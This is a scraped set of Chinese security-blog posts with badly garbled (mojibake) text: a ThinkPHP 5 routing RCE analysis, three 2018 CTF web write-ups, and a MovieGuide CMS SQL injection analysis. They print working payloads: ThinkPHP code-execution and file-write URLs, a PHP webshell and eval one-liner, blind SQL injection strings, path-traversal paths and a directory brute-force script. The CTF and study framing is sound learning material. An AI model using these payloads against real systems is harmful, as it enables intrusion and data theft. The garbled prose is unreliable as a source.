$instance = $this-&gt;app-&gt;controller($this-&gt;controller, $this-&gt;rule-&gt;getConfig('url_controller_layer'), $this-&gt;rule-&gt;getConfig('controller_suffix'), $this-&gt;rule-&gt;getConfig('empty_controller')); if ($instance instanceof Controller) &#123; $instance-&gt;registerMiddleware(); &#125; &#125; catch (ClassNotFoundException $e) &#123; throw new HttpException(404, 'controller not exists:' . $e-&gt;getClass()); &#125; // é—­åŒ…è°ƒç”¨ $this-&gt;app['middleware']-&gt;controller(function (Request $request, $next) use ($instance) &#123; // è·å–å½“å‰æ“ä½œå $action = $this-&gt;actionName . $this-&gt;rule-&gt;getConfig('action_suffix'); if (is_callable([$instance, $action])) &#123; // æ‰§è¡Œæ“ä½œæ–¹æ³• $call = [$instance, $action]; // ä¸¥æ ¼è·å–å½“å‰æ“ä½œæ–¹æ³•å $reflect = new ReflectionMethod($instance, $action); $methodName = $reflect-&gt;getName(); $suffix = $this-&gt;rule-&gt;getConfig('action_suffix'); $actionName = $suffix ? substr($methodName, 0, -strlen($suffix)) : $methodName; $this-&gt;request-&gt;setAction($actionName); // è‡ªåŠ¨è·å–è¯·æ±‚å˜é‡ $vars = $this-&gt;rule-&gt;getConfig('url_param_type') ? $this-&gt;request-&gt;route() : $this-&gt;request-&gt;param(); $vars = array_merge($vars, $this-&gt;param); &#125; elseif (is_callable([$instance, '_empty'])) &#123; // ç©ºæ“ä½œ $call = [$instance, '_empty']; $vars = [$this-&gt;actionName]; $reflect = new ReflectionMethod($instance, '_empty'); &#125; else &#123; // æ“ä½œä¸å­˜åœ¨ throw new HttpException(404, 'method not exists:' . get_class($instance) . '-&gt;' . $action . '()'); &#125; $this-&gt;app['hook']-&gt;listen('action_begin', $call); $data = $this-&gt;app-&gt;invokeReflectMethod($instance, $reflect, $vars); return $this-&gt;autoResponse($data); &#125;); return $this-&gt;app['middleware']-&gt;dispatch($this-&gt;request, 'controller');&#125; ç®€å•æè¿°execå‡½æ•°ï¼Œå®ä¾‹åŒ–controllerï¼Œç”¨äºåé¢20è¡Œåˆ°55è¡Œçš„é—­åŒ…å‡½æ•°ï¼Œè¿™ä¸ªå¿…æŠ¥å‡½æ•°ä¸»è¦å®Œæˆäº†è°ƒç”¨controllerçš„actionï¼Œå¹¶è·å–è¾“å…¥çš„å‚æ•°å€¼ï¼Œæœ€åç”±invokeReflectMethodå®Œæˆä¸»è¦çš„è°ƒç”¨ã€‚æœ€ç»ˆçš„è°ƒç”¨å‡½æ•°ä¸ºRequest::filterValueå‡½æ•°123456789101112131415161718192021222324252627282930private function filterValue(&amp;$value, $key, $filters)&#123; $default = array_pop($filters); foreach ($filters as $filter) &#123; if (is_callable($filter)) &#123; // è°ƒç”¨å‡½æ•°æˆ–è€…æ–¹æ³•è¿‡æ»¤ $value = call_user_func($filter, $value);//è°ƒç”¨å‡½æ•° &#125; elseif (is_scalar($value)) &#123; if (false !== strpos($filter, '/')) &#123; // æ­£åˆ™è¿‡æ»¤ if (!preg_match($filter, $value)) &#123; // åŒ¹é…ä¸æˆåŠŸè¿”å›é»˜è®¤å€¼ $value = $default; break; &#125; &#125; elseif (!empty($filter)) &#123; // filterå‡½æ•°ä¸å­˜åœ¨æ—¶, åˆ™ä½¿ç”¨filter_varè¿›è¡Œè¿‡æ»¤ // filterä¸ºéæ•´å½¢å€¼æ—¶, è°ƒç”¨filter_idå–å¾—è¿‡æ»¤id $value = filter_var($value, is_int($filter) ? $filter : filter_id($filter)); if (false === $value) &#123; $value = $default; break; &#125; &#125; &#125; &#125; return $value;&#125; åˆ°è¿™é‡Œå…¶å®æ€è·¯å¾ˆæ˜æ˜¾ï¼Œåˆ©ç”¨/åˆ†å‰²å‡ºèƒ½åˆ©ç”¨çš„controllerï¼Œå¹¶è¾“å…¥ç›¸åº”çš„å‚æ•°å€¼ï¼Œæ¥ä¸‹æ¥å°±æ˜¯æ‰¾å¯åˆ©ç”¨çš„å‡½æ•°ã€‚v5.0ç‰ˆæœ¬ä¸­pocéƒ½èƒ½ç”¨ å¦‚ä»»æ„å‘½ä»¤æ‰§è¡Œ?s=/index/think\\view\\driver\\php/display&amp;content=&lt;?php%20phpinfo();ä»»æ„æ–‡ä»¶å†™å…¥ï¼Œç”Ÿæˆåœ¨index.phpåŒä¸€çº§ç›®å½•?s=index/\\think\\template\\driver\\file/write&amp;cacheFile=test.php&amp;content=&lt;?php%20phpinfo();è·å–é…ç½®ä¿¡æ¯?s=index/\\think\\config/get&amp;name=database.usernameé™¤æ­¤ä¹‹å¤–ï¼Œè¿˜å¯ä»¥ä½¿ç”¨\\think\\request/inputï¼ˆv5.0ç‰ˆæœ¬ä¸èƒ½ç”¨æ˜¯å› ä¸ºthink\\requestçš„æ„é€ å‡½æ•°ä¸ºprotectedï¼Œä¸å…è®¸åŠ¨æ€è°ƒç”¨ï¼‰å¦‚ä»»æ„ä»£ç æ‰§è¡Œ?s=index/\\think\\request/input&amp;data[]=123&amp;filter=phpinfoinvokeFunctionæ ¸å¿ƒReflectionFunction?s=index/\\think\\container/invokeFunction&amp;function=call_user_func&amp;vars[0]=phpinfo&amp;vars[1]=1?s=index/\\think\\container/invokeFunction&amp;function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=1å› ä¸ºthink\\appç»§æ‰¿è‡ªthink\\containerï¼Œæ‰€ä»¥æ”¹æˆthink\\appä¹Ÿè¡Œå…¶ä¸­call_user_funcå¡«å……å‚æ•°æ—¶ï¼Œä»¥æ•°ç»„å½¢å¼ï¼Œç¬¬ä¸€ä¸ªä¸ºå‡½æ•°åï¼Œç¬¬äºŒä¸ªä¸ºå‡½æ•°å‚æ•°call_user_func_arrayå¡«å……å‚æ•°æ—¶ï¼Œä»¥æ•°ç»„å½¢å¼ï¼Œç¬¬ä¸€ä¸ªä¸ºå‡½æ•°åï¼Œç¬¬äºŒä¸ªä¸ºå‡½æ•°å‚æ•°ï¼ˆä¹Ÿä¸ºæ•°ç»„å½¢å¼ï¼‰è¿™é‡Œv5.1åªèƒ½ç”¨php7ï¼Œå¦‚v5.0è¿˜å¯ä»¥ä½¿ç”¨assertæ¥æ‰§è¡Œå‡½æ•° æ€»ç»“è¿™æ¬¡å‡ºçš„è¿™ä¸ªæ¼æ´å±å®³å¾ˆå¤§ï¼Œæ•´ä¸ªè°ƒç”¨è¿‡ç¨‹ä¹Ÿéå¸¸æ¼‚äº®ï¼Œå€¼å¾—ä¸€æ­¥ä¸€æ­¥è°ƒè¯•ã€‚å…¶ä¸­æ”¶è·å¤§è‡´å°±æ˜¯äº†è§£äº†thinkphp v5ç‰ˆæœ¬è·¯ç”±è°ƒç”¨çš„æµç¨‹ï¼Œv5.1ç‰ˆæœ¬çš„é—­åŒ…å‡½æ•°æ„é€ çš„æ–¹å¼ç»™æ¡†æ¶å¸¦æ¥äº†ä¸ä¸€æ ·çš„æ„Ÿå—ï¼Œä¸å¾—ä¸ç»™thinkphpä¸€ä¸ªèµ"},{"title":"SUCTF 2018 éƒ¨åˆ†web writeup","permalink":"http://blog.0kami.cn/2018/05/28/ctf/suctf-part-web-writeup/","text":"SUCTFæŠ½äº†ç‚¹æ—¶é—´åšäº†2é“SUCTFçš„webé¢˜ï¼Œè®°å½•ä¸€ä¸‹writeupã€‚ Anonymousè€ƒç‚¹phpçš„åŠ¨æ€å‡½æ•°æ‰§è¡Œï¼Œä»¥åŠcreate_functionæ‰€è¿”å›çš„åŒ¿åå‡½æ•° wpè®¿é—®é¢˜ç›®ï¼Œç›´æ¥ç»™äº†æºç 12345678910$MY = create_function(&quot;&quot;,&quot;some code&quot;); // æ‰§è¡Œäº†catå‘½ä»¤ï¼Œè¯»å–flagå†…å®¹$hash = bin2hex(openssl_random_pseudo_bytes(32));eval(&quot;function &apos;SUCTF_&apos;.$hash()&#123;&quot; .&quot;global \\$MY;&quot; .&quot;\\$MY();&quot; .&quot;&#125;&quot;);if(isset($_GET[&apos;func_name&apos;]))&#123; $_GET[&quot;func_name&quot;](); die();&#125; æ€è·¯æ¯”è¾ƒæ˜ç¡®ï¼Œå°±æ˜¯æƒ³åŠæ³•æ‰§è¡Œcreate_functionæ‰€äº§ç”Ÿçš„åŒ¿åå‡½æ•°ã€‚è€Œå…¶ä¸­SUCTF_32ï¼Œè¿™ä¸ªå‡½æ•°æ˜ç¡®æ˜¯æ²¡åŠæ³•çˆ†ç ´å‡ºæ¥çš„ã€‚é‚£ä¹ˆå°±åªèƒ½åœ¨ $MY ä¸Šä¸‹åŠŸå¤«ã€‚æ‰“å°ä¸€ä¸‹$MYçš„å€¼ï¼Œå‘ç°create_functionè¿”å›äº†\\0lambda_{number},é‚£ä¹ˆå°±å¾ˆæ˜ç¡®äº†ï¼Œåªè¦æš´åŠ›ä¸€ä¸‹è¿™ä¸ªnumberå°±æœ‰ä¸€å®šå‡ ç‡æ‰§è¡Œè¯¥å‡½æ•°ï¼Œè¿™é‡Œæˆ‘æš´åŠ›äº†å¤§æ¦‚1000å¤šå°±æœ‰2æ¡æ‰§è¡Œäº† Getshellè€ƒç‚¹https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html wp é¦–å…ˆç¡®å®šå¯ç”¨å­—ç¬¦ï¼Œä½¿ç”¨bpå°†æ‰€æœ‰å¯è§å­—ç¬¦æš´åŠ›ä¸€éåå‘ç°å¯æ‰“å°å­—ç¬¦ä¸º$ () [] _ ~ . ; =ï¼Œä»¥åŠå…¶ä»–ä¸å¯æ‰“å°å­—ç¬¦ã€‚ æ ¹æ®pç‰›çš„åšå®¢ï¼Œå‘ç°å–åä¸­æ–‡å¯ä»¥èµ·åˆ°ä½œç”¨ï¼Œæµ‹è¯•~({ä¸­æ–‡})å‘ç°å¯æ ¹æ®ä¸­æ–‡çš„utf-8ç¼–ç çš„ä¸­é—´2ä¸ªhexç è¿›è¡Œå¯¹å­—æ¯çš„éå†http://www.herongyang.com/gb2312_gb/pinyin_32.html å‡‘å‡ºå­—ç¬¦assertï¼Œ_GETï¼Œå¹¶åŠ¨æ€æ‰§è¡Œã€‚ä¸ºäº†å‡‘å‡ºä¸Šé¢çš„å­—ç¬¦ï¼Œæˆ‘é‡‡ç”¨é€ä¸ªåå–åbin2hex(~(&#39;a&#39;))è·å¾—ä¸­æ–‡utf-8ç¼–ç çš„ä¸­é—´2ä¸ªï¼Œæœè¡¨å³å¯æ‰¾åˆ°å¯¹åº”çš„ä¸­æ–‡ï¼Œå†™ä¸€ä¸‹æˆ‘çš„getshellä»£ç  123456789101112131415161718192021222324&lt;?php$_=~(ç);$__.=$_[[]==[]];$_=~(æŒŸ);$__.=$_[[]==[]];$_=~(æŒŸ);$__.=$_[[]==[]];$_=~(éš™);$__.=$_[[]==[]];$_=~(å¸);$__.=$_[[]==[]];$_=~(å‹‹);$__.=$_[[]==[]];$_=~(æ ¡);$___.=$_[[]==[]];$_=~(ä¸‹);$___.=$_[[]==[]];$_=~(çº¤);$___.=$_[[]==[]];$_=~(å«Œ);$___.=$_[[]==[]];$___=$$___;$__($___[_]); ä¸Šä¼ äº†shellä¹‹åå°±æ¯”è¾ƒå®¹æ˜“äº†ï¼Œç¿»ç›®å½•å³å¯ 12system(&apos;ls /&apos;)system(&apos;cat /Th1s_14_f14g&apos;) æ€»ç»“è®°å½•ä¸€ä¸‹getshellçš„å‘ç‚¹ evalä¸æ˜¯å‡½æ•°ï¼Œæ˜¯è¯­å¥ ä¸ç”¨å¼•å·ï¼Œç”¨ä¸­æ–‡ä¹Ÿè¢«phpå½“ä½œæ˜¯å­—ç¬¦ä¸² UTF-8ç¼–ç  http://www.herongyang.com/gb2312_gb/pinyin_32.html"},{"title":"DDCTF 2018 web writeup","permalink":"http://blog.0kami.cn/2018/04/21/ctf/ddctf-2018-web-writeup/","text":"DDCTF 2018 2é“WEB Writeup WEB00 æ•°æ®åº“çš„ç§˜å¯†step 1:index.php éœ€è¦ä»¥IP:116.85.43.88è®¿é—®ï¼Œhttpå¤´åŠ å…¥ X-Forwarded-For: 116.85.43.88 ç»•è¿‡ step 2:ç»•è¿‡åæ˜¯ä¸€ä¸ªç®€å•çš„æŸ¥è¯¢åŠŸèƒ½ï¼Œç®€å•æµ‹è¯•åå‘ç°id,title,dateæœ‰å®‰å…¨å¤„ç†ï¼Œä½†æ˜¯è¡¨å•ä¸­è¿˜éšè—ç€authorï¼Œå¹¶ä¸”æ²¡æœ‰åšä»»ä½•å¤„ç†ã€‚ä»¥payloada%&#39; &amp;&amp; &#39;%&#39;=&#39;%ã€a%&#39; &amp;&amp; &#39;%&#39;!=&#39;%ç¡®å®šæ³¨å…¥å­˜åœ¨,æƒ³ç€ç”¨unionç›´æ¥æå–å‡ºæ¥ï¼Œå‘ç°åå°è¿˜æœ‰WAFï¼Œæ²¡ç»•è¿‡å»ï¼Œä½†æ˜¯å¯¹äºç›²æ³¨ï¼ŒæˆåŠŸæ„é€ å‡ºäº†payloada%&#39;&amp;&amp;if(1, sleep (5),1)=&#39;%,å‘ç”Ÿ5ç§’å»¶è¿Ÿã€‚ï¼ˆåæ¥æƒ³æƒ³å…¶å®å¯ä»¥ç”¨boolå‹ç›²æ³¨æå–æ•°æ®ï¼‰ step 3:ç¡®è®¤äº†authorå­—æ®µå¯ä»¥æ³¨å…¥ï¼Œä½†æ˜¯è¿™é“é¢˜è¿˜æœ‰ä¸€ä¸ªé—®é¢˜å°±æ˜¯sha1æ ¡éªŒï¼Œè¦æƒ³å†™è„šæœ¬ï¼Œå¿…é¡»å…ˆè§£å†³è¿™ä¸ªé—®é¢˜ã€‚ç ”ç©¶äº†ä¸€ä¸‹main.jsï¼Œå‘ç°ä»¥ç±»ä¼¼id=title=date=author=time=çš„å­—ç¬¦ä¸²sha1å¤„ç†ååå°æ ¡éªŒ step 4:å†™è„šæœ¬ï¼Œä¸»è¦åŒ…æ‹¬sha1æ ¡éªŒå’Œæ—¶é—´ç›²æ³¨ï¼Œè´´ä¸€ä¸‹payload 123456789101112payload_1 = &quot;a%&apos; &amp;&amp; if((selEct LENGTH(schema_name) from information_schema.schemata limit &#123;0&#125;,1)=&#123;1&#125;,sleep (5),1)=&apos;%&quot;payload_2 = &quot;a%&apos; &amp;&amp; if((selEct substr(schema_name,&#123;0&#125;,1) from information_schema.schemata limit &#123;1&#125;,1)=&apos;&#123;2&#125;&apos;,sleep (5),1)=&apos;%&quot;# è·å–åˆ°åº“å ddctfpayload_3 = &quot;a%&apos; &amp;&amp; if((selEct LENGTH(table_name) from information_schema.tables where table_schema=&apos;ddctf&apos; limit &#123;0&#125;,1)=&apos;&#123;1&#125;&apos;,sleep (5),1)=&apos;%&quot;payload_4 = &quot;a%&apos; &amp;&amp; if((selEct substr(table_name,&#123;0&#125;,1) from information_schema.tables where table_schema=&apos;ddctf&apos; limit &#123;1&#125;,1)=&apos;&#123;2&#125;&apos;,sleep (5),1)=&apos;%&quot;# è·å–åˆ°è¡¨å message, ctf_key4payload_5 = &quot;a%&apos; &amp;&amp; if((selEct LENGTH(column_name) from information_schema.columns where table_schema=&apos;ddctf&apos;&amp;&amp;table_name=&apos;ctf_key4&apos; limit &#123;0&#125;,1)=&apos;&#123;1&#125;&apos;,sleep (10),1)=&apos;%&quot;payload_6 = &quot;a%&apos; &amp;&amp; if((selEct substr(column_name,&#123;0&#125;,1) from information_schema.columns where table_schema=&apos;ddctf&apos;&amp;&amp;table_name=&apos;ctf_key4&apos; limit &#123;1&#125;,1)=&apos;&#123;2&#125;&apos;,sleep (10),1)=&apos;%&quot;# è·å–åˆ°åˆ—å ctf_key4:secvalue; message: id,title,author,time,statuspayload_5 = &quot;a%&apos; &amp;&amp; if((selEct LENGTH(secvalue) from ctf_key4 limit &#123;0&#125;,1)=&apos;&#123;1&#125;&apos;,sleep (10),1)=&apos;%&quot;payload_6 = &quot;a%&apos; &amp;&amp; if((selEct substr(secvalue,&#123;0&#125;,1) from ctf_key4 limit &#123;1&#125;,1)=&apos;&#123;2&#125;&apos;,sleep (10),1)=&apos;%&quot;# è·å–åˆ°flag DDCTF&#123;MSBMCTFMXOCBYFYI&#125; WEB01 ä¸“å±é“¾æ¥step 1:æ ¹æ®é¢˜ç›®æç¤ºï¼Œé¢˜ç›®åªè·Ÿé“¾æ¥IPæœ‰å…³ï¼Œæ‰€ä»¥ä¸»è¦æœ‰1234http://116.85.48.102:5050/welcom/uuid #ä¸»é¡µ æ³¨æ„åˆ°ä¸Šé¢æœ‰email:3814166715717836733@didichuxing.comhttp://116.85.48.102:5050/image/banner/ZmF2aWNvbi5pY28= # ç»™äº†æç¤ºï¼Œåªèƒ½ä¸‹è½½.class,.ks,.ico,.xmlæ–‡ä»¶http://116.85.48.102:5050/news/topFiveNews # æ²¡ç”¨http://116.85.48.102:5050//flag/testflag/yourflag #è®¿é—®æŠ¥é”™ï¼Œä½†æ˜¯æš´éœ²äº†æ§åˆ¶å™¨è·¯å¾„com.didichuxing.ctf.controller.user.FlagController.java step 2:é‚£ä¹ˆæ¥ä¸‹æ¥å°±æ˜¯çŒœè·¯å¾„äº†ï¼Œåœ¨githubä¸Šæ‰¾äº†ä¸ªspringmvc+mybatisçš„é¡¹ç›®,ç»è¿‡æµ‹è¯•ï¼Œå‘ç°ä¸€ä¸‹å‡ ä¸ªæ–‡ä»¶ ../../WEB-INF/web.xml # å¾—åˆ°WEB-INF/applicationContext.xmlï¼Œcom.didichuxing.ctf.listener.InitListener ../../WEB-INF/applicationContext.xml # å¾—åˆ°classpath:mybatis/config.xml ../../WEB-INF/classes/mybatis/config.xml # å¾—åˆ°mapper/FlagMapper.xml ../../WEB-INF/classes/mapper/FlagMapper.xml # sqlè¯­å¥ ../../WEB-INF/classes/com/didichuxing/ctf/model/Flag.class ../../WEB-INF/classes/com/didichuxing/ctf/listener/InitListener.class ../../WEB-INF/classes/com/didichuxing/ctf/controller/user/FlagController.class ../../WEB-INF/classes/sdl.ks # å¯†é’¥æ–‡ä»¶ ../../WEB-INF/classes/com/didichuxing/ctf/service/impl/FlagServiceImpl.class ../../WEB-INF/classes/com/didichuxing/ctf/dao/FlagDao.class step 3:æŠŠä¸Šè¿°çš„classæ–‡ä»¶åœ¨çº¿åç¼–è¯‘åˆ°javaï¼Œé˜…è¯»åå‘ç°flagController.java 12345678@RequestMapping(value=&#123;&quot;/getflag/&#123;email:[0-9a-zA-Z&apos;]+&#125;&quot;&#125;, method=&#123;org.springframework.web.bind.annotation.RequestMethod.POST&#125;) public String getFlag(@PathVariable(&quot;email&quot;) String email, ModelMap model) &#123; Flag flag = flagService.getFlagByEmail(email); return &quot;Encrypted flag : &quot; + flag.getFlag(); &#125; ä»¥ç”¨æˆ·çš„é‚®ç®±æ¥è·å–åŠ å¯†çš„flagï¼Œé‚®ç®±å°±æ˜¯é¦–é¡µä¸Šçš„é‚®ç®±ï¼Œç„¶åé€šè¿‡listener.javaå¾—åˆ°å…·ä½“çš„åŠ å¯†è¿‡ç¨‹ 12345678910111213String flag = &quot;DDCTF&#123;&quot; + Math.abs(sr.nextLong()) + &quot;&#125;&quot;;String uuid = UUID.randomUUID().toString().replace(&quot;-&quot;, &quot;s&quot;);byte[] data = cipher.doFinal(flag.getBytes());byte[] e = mac.doFinal(String.valueOf(email.trim()).getBytes());Flag flago = new Flag();flago.setId(Integer.valueOf(id));flago.setFlag(byte2hex(data));flago.setEmail(byte2hex(e));flago.setOriginFlag(flag);flago.setUuid(uuid);flago.setOriginEmail(email); å¯ä»¥çœ‹åˆ°Emailè¢«è½¬åŒ–ä¸º16è¿›åˆ¶çš„å½¢å¼ï¼Œæ‰€ä»¥éœ€è¦å…ˆå¯¹é‚®ç®±åšå¤„ç†ï¼Œç®€å•ç¼–å†™ä»£ç ï¼ˆåé¢æ”¾ä¸Šæ¥ï¼‰ï¼Œå¾—åˆ°8EF662D0406A099B394DC817AB391718DD7BF29CCC1AAF32A7D7AB23C845CA27ï¼Œä»¥http://116.85.48.102:5050/flag/getflag/8EF662D0406A099B394DC817AB391718DD7BF29CCC1AAF32A7D7AB23C845CA27è¯·æ±‚åå¾—åˆ°åŠ å¯†çš„flagã€‚ step 4:æ¥ä¸‹æ¥å°±æ˜¯å†™ä»£ç è§£å¯†flagäº†ï¼Œå› ä¸ºå¯†é’¥æ–‡ä»¶åœ¨æ‰‹ï¼Œåªéœ€ç¼–å†™ç¨‹åºå³å¯ï¼Œå‚è€ƒhttps://stackoverflow.com/questions/39518979/basic-program-for-encrypt-decrypt-javax-crypto-badpaddingexception-decryption?utm_medium=organic&amp;utm_source=google_rich_qa&amp;utm_campaign=google_rich_qaéœ€è¦æ³¨æ„çš„æ˜¯è¿™é‡Œç”¨äº†ç§é’¥åŠ å¯†å…¬é’¥è§£å¯†ã€‚è§£å¯†åå¾—åˆ°flag"},{"title":"HITB-XCTF 2018 web writeup","permalink":"http://blog.0kami.cn/2018/04/15/ctf/hitb-xctf-2018-portion-web-writeup/","text":"upload è€ƒç‚¹windowså¹³å°çš„ä¸€äº›ç‰¹æ€§ windowså¹³å°ç‰¹æ€§windowsä¸‹æœç´¢æ–‡ä»¶ç”¨åˆ°çš„æ˜¯FindFirstFileï¼Œè¯¥å‡½æ•°æ‰§è¡Œæ—¶ï¼Œä¼šå°†&quot;&lt;&quot; =&gt; &quot;*&quot;ã€&quot;&gt;&quot; =&gt; &quot;?&quot;ã€&quot; =&gt; .ï¼Œæ‰€ä»¥åœ¨åº”ç”¨ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨è¿™ä¸ªç‰¹æ€§ã€‚e.g. `?filename=a&gt; =&gt; a?` åŒ¹é…å•ä¸ªå­—ç¬¦ `?filename=a&lt; =&gt; a*` åŒ¹é…å¤šä¸ªå­—ç¬¦ `?filename=a&quot; =&gt; a.` NTFS ADSç‰¹æ€§ ä¸Šä¼ çš„æ–‡ä»¶å ç³»ç»Ÿç»“æœ test.php:a.jpg ç”Ÿæˆtest.phpï¼Œä½†æ˜¯æ— å†…å®¹ test.php::$DATA ç”Ÿæˆtest.phpï¼Œæœ‰å†…å®¹ test.php::$INDEX_ALLOCATION ç”Ÿæˆtest.phpæ–‡ä»¶å¤¹ test.php::$DATA.jpg ç”Ÿæˆ0.jpgï¼Œæœ‰å†…å®¹ test.php::$DATA\\test.jpg ç”Ÿæˆaaa.jpgï¼Œæœ‰å†…å®¹ è¿‡ç¨‹ step 1:åŠŸèƒ½ç‚¹#æ–‡ä»¶ä¸Šä¼  #ä¸Šä¼ æ–‡ä»¶å®½é«˜ =&gt; getshellç¯å¢ƒï¼šIIS7.0 Windows Server 2008 Standard Edition Service Pack 2 step 2:æ–‡ä»¶ä¸Šä¼ åŠŸèƒ½é»‘åå•phpï¼Œæ–‡ä»¶åå‰ç¼€æ—¶é—´æˆ³é‡å†™ï¼Œä½†æˆªå–ä¸Šä¼ æ–‡ä»¶åçš„æœ€åä¸€ä¸ªåç¼€ä¸å˜ã€‚ç®€å•åˆ©ç”¨ADSç‰¹æ€§ï¼Œä¸Šä¼ test.php::$DATA step 3:ä¸Šä¼ äº†æ–‡ä»¶åï¼Œéœ€è¦æ‰¾åˆ°æ–‡ä»¶ç›®å½•ã€‚pic.phpè¿”å›äº†ä¸Šä¼ æ–‡ä»¶å®½å’Œé«˜ï¼ŒçŒœæµ‹å…¶ä½¿ç”¨äº†getimagesizeï¼Œæƒ³åˆ°å‰æ®µæ—¶é—´çš„ä¸€ç¯‡å¸–å­ï¼Œå†™ä¸ªè„šæœ¬è·‘è¯¥å¤æ‚ç›®å½• 1234567891011121314151617#!/usr/bin/env python# -*- coding: utf-8 -*-# Created by wh1t3P1g at 2018/4/11import requestsstr=&quot;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;ret=&quot;&quot;for i in range(32): for c in str: t=ret+c url=&quot;http://47.90.97.18:9999/pic.php?filename=../&quot;+t+&quot;%3C/1523456340.jpg&quot; r=requests.get(url) if &quot;width&quot; in r.content: ret+=c print ret break å¾—åˆ°ç›®å½•87194f13726af7cee27ba2cfe97b60df step 4:æœ‰äº†ç›®å½•å°±èƒ½è®¿é—®ä¸Šä¼ çš„ä¸€å¥è¯&lt;?php eval($_POST[cmd]);?&gt;ï¼Œç³»ç»Ÿç¦ç”¨äº†æ‰§è¡Œç³»ç»Ÿå‘½ä»¤çš„ä¸€äº›å‡½æ•°ï¼Œä½†æ˜¯è¿™é‡Œå¹¶ä¸éœ€è¦æ‰§è¡Œå‘½ä»¤ã€‚è¿™é‡Œä¸æˆªå›¾äº†cmd=var_dump(glob(&quot;../*&quot;));å¾—åˆ°flag.phpï¼Œè®¿é—®åå‘ç°éœ€è¦è¯»å–flag.phpçš„å†…å®¹cmd=echo readfile(&quot;../flag.php&quot;);å¾—åˆ°flag æ€»ç»“è¿™æ¬¡å°±åšäº†ä¸€é“webï¼Œè¿˜æœ‰å¾…æé«˜å’Œç§¯ç´¯:)"},{"title":"MovieGuide v2.0 SQLi","permalink":"http://blog.0kami.cn/2018/02/03/php/MovieGuide2SQLi/","text":"0x00Detail: Movie Guide v2.0 SQL Injection 0x01è¿™æ˜¯ä¸€ä¸ªæ¯”è¾ƒç²—ç³™çš„å¼€æºcmsï¼Œæ€»ä½“æ¥è¯´å¹¶æ²¡æœ‰å¯¹è¾“å…¥è¾“å‡ºåšå®‰å…¨å¤„ç†ï¼Œä»PoCå…¥æ‰‹ï¼Œé€‰ä¸€ä¸ªè¿˜åŸä¸€ä¸‹æ¼æ´å½¢æˆè¿‡ç¨‹ã€‚ PoCï¼šindex.php?md=[SQL]å®šä½ä¸€ä¸‹mdå‚æ•°layout.phpä¸ºè¯¥cmsçš„ä¸»è¦å…¥å£å¤„ç†,ä¸‹è¿°çš„å˜é‡å‡æ²¡æœ‰é€šè¿‡å®‰å…¨å¤„ç†ï¼Œç›´æ¥SQLè¯­å¥ï¼Œä»è€Œéƒ½å¯ä»¥ç”¨äºæ•°æ®åº“æ³¨å…¥ã€‚12345678//Get the passed variables.$mterm = filter_input(INPUT_POST, 'tterm');$cterm = filter_input(INPUT_POST, 'gterm');$lterm = filter_input(INPUT_GET, 'gterm');$yterm = filter_input(INPUT_GET, 'year');$md = filter_input(INPUT_GET, 'md');$actorname = filter_input(INPUT_GET, 'actor');$directorname = filter_input(INPUT_GET, 'director'); ç›´æ¥æ‹¼æ¥å…¥SQLè¯­å¥1$sql = &quot;SELECT * FROM `Movie_List` WHERE `Main_Dir` LIKE &apos;&quot; . $md . &quot;&apos; ORDER BY `Movie_Title` ASC Limit $start, $perpage&quot;; è¿™é‡Œæ¯”è¾ƒæœ‰æ„æ€çš„æ˜¯å®ƒçš„PoCï¼Œä»¥å‰æ²¡æœ‰è§è¿‡ç±»ä¼¼çš„:bï¼ŒPoCä¸­ä½¿ç”¨äº†export_setå‡½æ•° EXPORT_SET(bits,on,off[,separator[,number_of_bits]])Returns a string such that for every bit set in the value bits, you get an on string and for every bit not set in the value, you get an off string. Bits in bits are examined from right to left (from low-order to high-order bits). Strings are added to the result from left to right, separated by the separator string (the default being the comma character ,). The number of bits examined is given by number_of_bits, which has a default of 64 if not specified. number_of_bits is silently clipped to 64 if larger than 64. It is treated as an unsigned integer, so a value of âˆ’1 is effectively the same as 64. åˆ†è§£ä¸€ä¸‹PoC123456789101112131415/*!02222UNION*/( /*!02222SELECT*/ 0x253238253331253239,0x253238253332253239, ( /*!02222Select*/ export_set(5,@a:=0, (/*!02222select*/ count(*)/*!02222from*/(information_schema.columns)where@a:=// data-&gt;@a export_set(5, export_set(5,@a,/*!02222table_name*/,&apos;&lt;li&gt;&apos;,2)//dump table_name [0&lt;li&gt;table_name] ,/*!02222column_name*/,&apos;\\n:&apos;,2)//dump column_name [0&lt;li&gt;table_name\\n:columns_name] ) ,@a,2)//set @a split char ) ,0x253238253334253239,0x253238253335253239,0x253238253336253239,0x253238253337253239,0x253238253338253239,0x253238253339253239,0x253238253331253330253239,0x253238253331253331253239,0x253238253331253332253239 )-- - è¿™é‡Œä¸»è¦åˆ©ç”¨çš„æ˜¯export_setå‡½æ•°çš„noï¼Œoffä½ç½®æ¥dumpæ•°æ®ã€‚ é¦–å…ˆé€šè¿‡@a:=0ï¼Œå®šä¹‰å˜é‡aä¸º0ï¼ˆå¯èƒ½è·Ÿmysqlç‰ˆæœ¬æœ‰å…³ç³»ï¼Œ5.7.xä¸‹çš„mysqlæ— æ³•ç”¨@:=0æ¥å®šä¹‰ï¼‰ æœ€é‡Œé¢çš„export_setï¼Œå°†table_name dumpå‡ºæ¥ï¼ˆç»“æœä¸º0&lt;li&gt;table_nameï¼‰ æ¥ä¸‹æ¥çš„ä¸€ä¸ªexport_setï¼Œå°†columns_name dumpå‡ºæ¥(ç»“æœä¸º0&lt;li&gt;table_name\\n:columns_name) select count(*) from (information_schema.columns)where@a:=export_set(5,export_set(5,@a,table_name,&#39;&lt;li&gt;&#39;,2),column_name,&#39;\\n:&#39;,2)å°†ä¸Šè¿°çš„æ•°æ®èµ‹å€¼ç»™å˜é‡a æœ€åç”¨æœ€åä¸€ä¸ªexport_setï¼Œç”¨@aåšåˆ†éš”ç¬¦ï¼Œå°†æ•°æ®dumpå‡ºæ¥ 0x02 æ€»ç»“è¯¥cmsçš„æ³¨å…¥æ¼æ´å¾ˆå¸¸è§„ï¼Œä¸»è¦æ˜¯å­¦ä¹ åˆ†æäº†è¯¥PoCï¼Œèƒ½åœ¨æœªæ¥æ³¨å…¥ç»•è¿‡çš„åœ°æ–¹åº”ç”¨ã€‚ mysqlçš„è‡ªå®šä¹‰å˜é‡@çš„åº”ç”¨ï¼Œå¯ä»¥åœ¨ä¸€å®šç¨‹åº¦ä¸Šæ¶ˆé™¤ç©ºæ 